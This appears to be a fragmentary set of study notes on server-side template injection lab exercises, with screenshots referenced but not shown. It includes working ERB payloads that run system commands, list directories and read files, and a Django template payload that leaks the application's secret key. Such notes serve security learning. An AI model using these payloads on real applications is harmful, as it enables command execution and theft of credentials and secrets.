...
![[SSTI-20260114204747801.png|462]]
...
- `GET /?message=Unfortunately...`  after clicking on View details
	- `<%25%3d+7*7+%25>`
		- 49 in response
			- **SSTImap: OK** - [[SSTI#3.1. Lab Basic server-side template injection ⭕️]]
...
```
# 3.1. Lab Basic server-side template injection
GET /?message=<%25%3d+system("cat+/home/carlos/morale.txt")+%25>

# Alternatives
# Lists out directories
<%25%3d+Dir.entries('/')+%25>

# Uses file read
<%25%3d+File.read('/home/carlos/secret')+%25>
```

Change preferred name feature
...
- Product > Edit template has this syntax: `${someExpression}`
	- **SSTImap: OK** [[SSTI#3.3. Lab Server-side template injection using documentation ⭕️]]
...
2. Home > find a blog and post a comment and notice that the comment will show wiener's nickname: `H0td0g`. It would show `Peter Wiener` by default or by Name.
	1. ![[SSTI-20260114210300929.png|184]]
...
cat morale.txt
```
![[Pasted image 20260221110647.png]]
...
1. Login > select a product > Edit template > notice in the textbox that it has the syntax `{{someExpression}}`. Throw any of the fuzzing strings below and it will throw an error revealing the template framework: Django.
	1. ![[SSTI-20260115170647240.png]]
	2. ![[SSTI-20260115170706960.png]]
2. `{{settings.SECRET_KEY}}` will show the secret key, submit and solve.
	1. ![[SSTI-20260115170840236.png]]
```
${{<%[%'"}}%\,
{% debug %} 
{{settings.SECRET_KEY}}
